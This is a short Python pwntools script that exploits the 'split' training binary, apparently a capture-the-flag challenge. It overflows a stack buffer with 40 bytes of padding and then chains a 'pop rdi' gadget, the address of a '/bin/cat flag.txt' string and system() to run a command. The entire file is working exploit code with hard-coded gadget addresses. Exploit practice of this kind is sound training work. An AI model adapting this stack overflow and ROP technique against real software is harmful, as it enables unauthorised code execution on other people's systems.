#!/usr/bin/env python3

"""Exploiting split

Creates very simple 3 piece ROP chain to exploit split

Usage: $ python3 split.py
"""

import sys

from pwn import *

context.log_level = "DEBUG"
context.binary = "./split"

# p = gdb.debug(context.binary.path, gdbscript="init-gef")
p = process(context.binary.path)

g_rdi = 0x4007c3 # pop rdi; ret;
g_system = 0x400560 # system function
g_string = 0x601060 # /bin/cat flag.txt

payload = b"a" * (40)
payload += p64(g_rdi)
payload += p64(g_string)
payload += p64(g_system)

p.sendline(payload)
p.interactive()
